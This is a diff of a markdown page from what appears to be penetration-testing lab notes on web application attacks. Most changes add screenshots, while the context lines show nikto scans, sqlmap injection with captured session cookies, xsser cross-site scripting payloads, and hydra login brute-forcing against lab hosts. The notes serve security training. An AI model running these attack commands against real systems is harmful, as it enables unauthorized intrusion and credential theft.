@@ -1,4 +1,4 @@
-# 12. Web application
+# Web application
 
 ### Introduction
 
@@ -40,9 +40,13 @@ kali@kali> curl http://192.193.74.3/data/account.xml
 
 Start Burp Suite and capture the packet from http://192.168.23.3.
 
+<figure><img src="../../.gitbook/assets/133.png" alt=""><figcaption></figcaption></figure>
+
 Then move the request to the intruder and add the wordlist `/usr/share/wordlists/dirb/common.txt` and **attack**.
 
 ### ZAProxy
+
+<figure><img src="../../.gitbook/assets/134.webp" alt=""><figcaption></figcaption></figure>
 
 ### Nikto
 
@@ -50,7 +54,11 @@ Then move the request to the intruder and add the wordlist `/usr/share/wordlists
 kali@kali> nikto http://192.19.125.3
 ```
 
+<figure><img src="../../.gitbook/assets/135.png" alt=""><figcaption></figcaption></figure>
+
 ### SQLMap
+
+<figure><img src="../../.gitbook/assets/136.png" alt=""><figcaption></figcaption></figure>
 
 * Connect to bwap with credentials `bee:bug`.
 * Grab the cookie by inspecting the GET request for http://192.222.140.3/portal.php (bd8t5qipab8p64f85oitd9f5f5)
@@ -76,13 +84,21 @@ kali@kali> sqlmap -r request -t title
 * Turn on BurpSuite.
 * Capture the packet.
 
+<figure><img src="../../.gitbook/assets/137.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/138.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 kali@kali> xsser --url http://192.69.131.3/index.php?page=dns-lookup.php -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
 ```
 
+<figure><img src="../../.gitbook/assets/139.png" alt=""><figcaption></figcaption></figure>
+
 ```bash
 kali@kali> xsser --url http://192.69.131.3/index.php?page=dns-lookup.php -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp '<script>alert(1)</script>'
 ```
+
+<figure><img src="../../.gitbook/assets/140.png" alt=""><figcaption></figcaption></figure>
 
 Copy/paste the **Final attack** to BurpSuite then run and you will have a JavaScript alert.
 
@@ -92,6 +108,8 @@ Copy/paste the **Final attack** to BurpSuite then run and you will have a JavaSc
 kali@kali> xsser --url 'http://192.194.74.3/htmli_get.php?firstname=XSS&lastname=doe&form=submit' --cookie 'PHPSESSID=83rlkqf374baia021e64usk9e2; security_level=0'
 kali@kali> xsser --url 'http://192.194.74.3/htmli_get.php?firstname=XSS&lastname=doe&form=submit' --cookie 'PHPSESSID=83rlkqf374baia021e64usk9e2; security_level=0' --Fp '<script>alert(0)</script>'
 ```
+
+<figure><img src="../../.gitbook/assets/141.png" alt=""><figcaption></figcaption></figure>
 
 ### HTTP Login form with Hydra
 
@@ -104,7 +122,13 @@ kali@kali> hydra -L users -P passwords 192.107.115.3 http-post-form '/login.php:
 * Go to http://192.89.33.3/basic and you will need to authenticate by a form.
 * Open BurpSuite and catch the form request.
 
+<figure><img src="../../.gitbook/assets/142.png" alt=""><figcaption></figcaption></figure>
+
 The `Authorization` is base64 encoded.
+
+<figure><img src="../../.gitbook/assets/143.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/144.png" alt=""><figcaption></figcaption></figure>
 
 * Add a wordlist `/root/desktop/wordlists/common_password.txt`
 * Add 2 rules
